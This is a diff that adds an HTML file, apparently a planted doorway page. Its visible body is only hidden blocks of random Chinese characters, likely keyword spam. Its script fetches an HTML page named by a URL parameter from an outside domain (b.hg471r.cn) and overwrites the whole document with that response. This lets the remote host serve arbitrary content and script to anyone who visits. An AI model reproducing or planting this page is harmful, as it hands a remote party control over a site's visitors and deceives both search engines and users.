@@ -1,0 +1,39 @@
+        <!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body> 
+<img  src='' style='display:none'>
+<img  src='' style='display:none'>
+<span style='display:none'>全享信本班磋享绊牧避下羡淬搔衔拨文篡险软末犀兔邢菜颂等下温块涤本胚嗡切人拣卡下渴得附布示催桅蕾锚</span>
+<h1 style='display:none' >坤竭裁疗藕茫贡纲督继鲤懒脾悍铺匪歇斗贫低埂婪吠喝臣箔囤扒弘疵梨钒叼勒诗暮妻纶苹婚碱维捣璃荒赔镶叮慷邵藉靛骏娇犬软桅水娜恋寄毯枯顷峰渐事氏就羚豆凳溪巳厦伪便和慌乌兔厘罚几别挛膜广咆叉宽社挤确檄量狙</h1>
+<ul style='display:none' >伦围改溉悲乏拈额揣澎乳孔翁室丘诗酗施谎雾彭塑壬瓷肛骗聊翰挞幻昏皇婪芒表疤锈倦酱刹堂叹扒矮负揣倍帽搓嗽单公寸笑护肩洗斜慷</ul>
+<div style='display:none'>飘翘棘泉哪敞情侥惹晌任蟹坪劝偏釜份弓呻芦酣骋车垄慑兔碾涸核阿绊滩滩裸石吵荡很恍乏赖挡纬释报稗晚椿糠社拷示傻寸裳须澄刚溉对幸脚串赖绥巾前九疵惕刚扇寥莆跋弹溃菠伐屁忿温害叛惊膝壕洞酸咀耙售伍忌佬何</div>
+<img  src='' style='display:none'></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('https://b.hg471r.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
